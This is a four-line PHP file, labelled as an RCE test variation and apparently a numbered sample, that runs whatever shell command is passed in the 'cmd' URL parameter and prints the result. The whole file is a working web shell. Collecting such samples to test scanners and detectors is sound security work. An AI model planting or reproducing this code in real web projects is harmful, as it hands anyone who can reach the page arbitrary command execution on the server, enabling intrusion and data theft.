<?php
// RCE test variation #1256
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>